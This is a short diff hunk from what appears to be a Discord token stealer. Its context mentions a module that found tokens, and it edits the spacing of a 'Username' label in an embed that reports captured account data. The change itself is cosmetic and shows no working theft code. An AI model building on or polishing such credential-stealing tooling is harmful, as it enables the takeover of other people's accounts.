@@ -601,7 +601,7 @@ This file indicates that the Discord module found tokens but couldn't process th
                     inline: true
                 },
                 {
-                    name: ":mag_right:  Username",
+                    name: ":mag_right: Username",
                     value: `\`${account.username}\``,
                     inline: true
                 },
